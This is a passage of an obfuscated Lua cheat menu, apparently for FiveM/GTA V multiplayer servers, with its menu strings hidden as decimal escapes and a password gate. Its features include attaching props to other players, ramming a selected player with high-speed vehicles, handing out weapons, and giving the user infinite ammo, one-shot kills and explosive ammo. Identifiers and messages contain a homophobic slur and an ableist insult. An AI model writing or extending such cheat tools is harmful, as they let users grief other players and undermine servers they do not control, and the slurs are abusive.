                        freezePlayer,
                        function(KAKAAKAKAK)
                            freezePlayer = KAKAAKAKAK
                        end)
                    then
                    end

                    ililililil()
                elseif Plane.IsMenuOpened("\83\112\97\119\110\80\114\111\112\115\77\101\110\117\10") then
                    if IlIlIlI(
                        "Attach Prop To Player",
                        attachProp,
                        function(KAKAAKAKAK)
                            attachProp = KAKAAKAKAK
                        end)
                    then
                    elseif LiLLL("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(CURENTIXDDd, DWADIOHDWwww13)
                        currentBone = CURENTIXDDd
                        selectedBone = DWADIOHDWwww13
                    end)
                    then
                    elseif IlIlIlIlIlI("Weed") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), waduyh487r64)
                        local obj = CreateObject(Ggggg("prop_weed_01"),coords.x,coords.y,coords.z,waduyh487r64,waduyh487r64,waduyh487r64)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                            end
                        end
                    elseif IlIlIlIlIlI("UFO") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), waduyh487r64)
                        local obj = CreateObject(Ggggg("p_spinning_anus_s"),coords.x,coords.y,coords.z,waduyh487r64,waduyh487r64,waduyh487r64)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                            end
                        end
                    elseif IlIlIlIlIlI("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), waduyh487r64)
                        local obj = CreateObject(Ggggg("prop_windmill_01"),coords.x,coords.y,coords.z,waduyh487r64,waduyh487r64,waduyh487r64)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),39317),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                            end
                        end
                    elseif IlIlIlIlIlI("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), waduyh487r64)
                        local input = pikgfrihfg("Enter Prop Name", "", 100)
                        if IsModelValid(input) then
                            local obj = CreateObject(Ggggg(input),coords.x,coords.y,coords.z,waduyh487r64,waduyh487r64,waduyh487r64)
                            if attachProp then
                                if selectedBone == 1 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                                elseif selectedBone == 2 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                                end
                            end
                        else
                            adyt23h23("Invalid Model!")
                        end
                    end

                    ililililil()
            elseif Plane.IsMenuOpened("\86\101\104\105\99\108\101\82\97\109\77\101\110\117\10") then
                if IlIlIlIlIlI("Futo") then
                    local keduxben = Ggggg("futo")
                    RequestModel(keduxben)
                    while not HasModelLoaded(keduxben) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                    if HasModelLoaded(keduxben) then
                        local vvvvvvvvvvvvvvvvvvvvvvvv = CreateVehicle(keduxben, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), waduyh487r64, waduyh487r64)
                        SetVehicleForwardSpeed(vvvvvvvvvvvvvvvvvvvvvvvv, 120.0)
                    end
                elseif IlIlIlIlIlI("Bus") then
                    local keduxben = Ggggg("bus")
                    RequestModel(keduxben)
                    while not HasModelLoaded(keduxben) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                    if HasModelLoaded(keduxben) then
                        local vvvvvvvvvvvvvvvvvvvvvvvv = CreateVehicle(keduxben, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), waduyh487r64, waduyh487r64)
                        SetVehicleForwardSpeed(vvvvvvvvvvvvvvvvvvvvvvvv, 120.0)
                    end
                end


                    ililililil()
            elseif Plane.IsMenuOpened("\83\105\110\103\108\101\10WepPlayer") then
                for i = 1, #faggot123 do
                    if IlIlIlIlIlI(faggot123[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), Ggggg(faggot123[i]), 250, KZjx, waduyh487r64)
                    end
                end


                ililililil()
            elseif Plane.IsMenuOpened("\87\101\97\112\111\110\77\101\110\117\10") then
                if LDOWJDWDdddwdwdad("~r~→  ~s~Single Weapon Spawner", "\83\105\110\103\108\101\10\87\101\97\112\111\110\77\101\110\117\10") then
                elseif IlIlIlIlIlI("Give All Weapons") then
                    for i = 1, #faggot123 do
                        GiveWeaponToPed(PlayerPedId(), Ggggg(faggot123[i]), 250, KZjx, KZjx)
                    end
                elseif IlIlIlIlIlI("Remove All Weapons") then
                    for i = 1, #faggot123 do
                        RemoveAllPedWeapons(PlayerPedId(), waduyh487r64)
                    end
                elseif IlIlIlIlIlI("Give Ammo") then
                    for i = 1, #faggot123 do
                        AddAmmoToPed(PlayerPedId(), Ggggg(faggot123[i]), 250)
                    end
                elseif IlIlIlI(
                    "No Reload",
                    dwadawdwd,
                    function(KAKAAKAKAK)
                        dwadawdwd = KAKAAKAKAK
                        SetPedInfiniteAmmoClip(PlayerPedId(), dwadawdwd)
                    end)
                then
                elseif IlIlIlI(
                    "Infinite Ammo",
                    JYGNDJ,
                    function(KAKAAKAKAK)
                        JYGNDJ = KAKAAKAKAK
                        SetPedInfiniteAmmo(PlayerPedId(), JYGNDJ)
                    end)
                then
                elseif IlIlIlI(
                    "Explosive Ammo",
                    bifegfubffff,
                    function(KAKAAKAKAK)
                        bifegfubffff = KAKAAKAKAK
                    end)
                then
                elseif IlIlIlI(
                    "Oneshot",
                    Oneshot,
                    function(KAKAAKAKAK)
                        Oneshot = KAKAAKAKAK
                    end)
                then
				elseif IlIlIlI(
                    "No Recoil",
                    NOXJDSS,
                    function(KAKAAKAKAK)
                        NOXJDSS = KAKAAKAKAK
                    end)
                then
                elseif IlIlIlI(
                    "Delete Gun",
                    WADOHWIB,
                    function(KAKAAKAKAK)
                        WADOHWIB = KAKAAKAKAK
                    end)
                then
                elseif LDOWJDWDdddwdwdad("~r~→  ~s~Weapon Customization", "\87\101\97\112\111\110\67\117\115\116\111\109\105\122\97\116\105\111\110\10") then
                elseif LDOWJDWDdddwdwdad("~r~→  ~s~Bullet Gun Options", "\66\117\108\108\101\116\71\117\110\77\101\110\117\10") then
                end

                ililililil()
            elseif Plane.IsMenuOpened("\87\101\97\112\111\110\67\117\115\116\111\109\105\122\97\116\105\111\110\10") then
                if IlIlIlI(
                    "Rainbow Tint",
                    rainbowTint,
                    function(KAKAAKAKAK)
                        rainbowTint = KAKAAKAKAK
                    end)
                then
                elseif LiLLL("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(CURENTIXDDd, DWADIOHDWwww13)
                    currentTint = CURENTIXDDd
                    selectedTint = DWADIOHDWwww13

                    if selectedTint == 1 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
                    end
                    if selectedTint == 2 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
                    end
                    if selectedTint == 3 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
                    end
                    if selectedTint == 4 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
                    end
                    if selectedTint == 5 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
                    end
                    if selectedTint == 6 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
                    end
                    if selectedTint == 7 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
                    end
                    if selectedTint == 8 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
                    end
                end)
                then
                elseif IlIlIlIlIlI("~g~Add Special Finish") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif IlIlIlIlIlI("~r~Remove Special Finish") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif IlIlIlIlIlI("~g~Add Suppressor") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif IlIlIlIlIlI("~r~Remove Suppressor") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif IlIlIlIlIlI("~g~Add Scope") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                elseif IlIlIlIlIlI("~r~Remove Scope") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                end

                ililililil()
            elseif Plane.IsMenuOpened("\66\117\108\108\101\116\71\117\110\77\101\110\117\10") then
                if IlIlIlI(
                    "Vehicle Gun",
                    vehicleGun,
                    function(KAKAAKAKAK)
                        vehicleGun = KAKAAKAKAK
                    end)
                then
                elseif LiLLL("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(CURENTIXDDd, DWADIOHDWwww13)
                    currentVehicle = CURENTIXDDd
                    selectedVehicle = DWADIOHDWwww13

                end)
                then
                elseif LiLLL("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(CURENTIXDDd, DWADIOHDWwww13)
                    currentVehicleSpeed = CURENTIXDDd
                    selectedVehicleSpeed = DWADIOHDWwww13
                end)
                then
                elseif IlIlIlI(
                    "Ped Gun",
                    pedGun,
                    function(KAKAAKAKAK)
                        pedGun = KAKAAKAKAK
                end)
                then
                elseif LiLLL("Ped To Shoot", peds, currentPed, selectedPed, function(CURENTIXDDd, DWADIOHDWwww13)
                    currentPed = CURENTIXDDd
                    selectedPed = DWADIOHDWwww13
                end)
                then
                elseif IlIlIlI(
                    "Bullet Gun",
                    bulletGun,
                    function(KAKAAKAKAK)
                        bulletGun = KAKAAKAKAK
                    end)
                then
                elseif LiLLL("Bullet", bullets, currentBullet, selectedBullet, function(CURENTIXDDd, DWADIOHDWwww13)
                    currentBullet = CURENTIXDDd
                    selectedBullet = DWADIOHDWwww13
                    end)
                then
                end




                ililililil()
            elseif Plane.IsMenuOpened("\83\105\110\103\108\101\10\87\101\97\112\111\110\77\101\110\117\10") then
                for i = 1, #faggot123 do
                    if IlIlIlIlIlI(faggot123[i]) then
                        GiveWeaponToPed(PlayerPedId(), Ggggg(faggot123[i]), 250, KZjx, KZjx)
                    end
                end



                ililililil()
            elseif IsDisabledControlPressed(0, 162) then
                if planeisbest then
                    trynaskidhuh("\77\97\105\110\77\101\110\117\10")
                else
                    local temp = pikgfrihfg("\69\110\116\101\114\32\80\97\115\115\119\111\114\100\10", "", 100)
                    if temp == dEI then
                        adyt23h23("~r~~h~\87\101\108\108\32\100\111\110\101\44\32\121\111\117\32\106\117\115\116\32\108\111\103\103\101\100\32\105\110\33\10")
                        planeisbest = waduyh487r64
                        trynaskidhuh("\77\97\105\110\77\101\110\117\10")
                    else
                        adyt23h23("~r~~h~\76\111\103\105\110\32\104\97\115\32\102\97\105\108\101\100\44\32\97\114\101\32\121\111\117\32\102\117\99\107\105\110\103\32\114\101\116\97\114\100\101\100\63\10")
                    end
                end
            end

            Citizen.Wait(0)
        end
    end)